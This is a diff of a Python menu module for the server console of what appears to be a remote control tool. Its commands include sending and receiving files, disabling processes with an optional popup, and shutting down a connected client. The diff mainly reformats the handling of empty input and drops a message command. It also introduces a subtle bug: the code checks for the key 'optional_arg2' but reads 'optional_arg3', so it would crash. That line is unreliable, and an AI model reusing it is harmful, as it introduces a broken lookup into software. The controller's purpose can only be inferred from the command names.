@@ -22,7 +22,7 @@ def menu_help(_list):
             out += f" <{_list[i]['arg2']}>"
 
         if "optional_arg2" in _list[i]:
-            out += f" [{_list[i]['optional_arg2']}]"
+            out += f" [{_list[i]['optional_arg3']}]"
 
         if i != len(_list) - 1:
             out += "\n"
@@ -65,9 +65,10 @@ class View:
         while True:
             choice = _input(">> ")
 
-            if choice == "": continue
-
             self.control.socket.refresh()
+
+            if choice == "":
+                continue
 
             if self.check_input(choice, SERVER_MAIN_COMMAND_LIST):
                 match choice[0]:
@@ -100,14 +101,13 @@ class View:
                 choice = _input("interact>> ")
                 self.control.socket.send_json(CLIENT_HEARTBEAT)
 
-                if choice == "": continue
+                if choice == "":
+                    continue
 
                 if self.check_input(choice, SERVER_INTERACT_COMMAND_LIST):
                     match choice[0]:
                         case c.MENU_HELP:
                             menu_help(SERVER_INTERACT_COMMAND_LIST)
-                        case c.MENU_INTERACT_MSG:
-                            self.control.message(choice[1])
                         case c.MENU_INTERACT_SEND:
                             self.control.send_file()
                         case c.MENU_INTERACT_RECV:
@@ -137,7 +137,8 @@ class View:
                             else:
                                 self.control.logger.error("Invalid argument")
                         case c.MENU_INTERACT_DISABLE_PROCESS:
-                            self.control.toggle_disable_process(choice[1])
+                            self.control.toggle_disable_process(choice[1], True if len(choice) > 2 and choice[
+                                2] == MENU_INTERACT_DISABLE_PROCESS_POPUP else False)
                         case c.MENU_INTERACT_SHUT:
                             if choice[1] == c.MENU_INTERACT_SHUT_SHUTDOWN:
                                 self.control.shutdown()
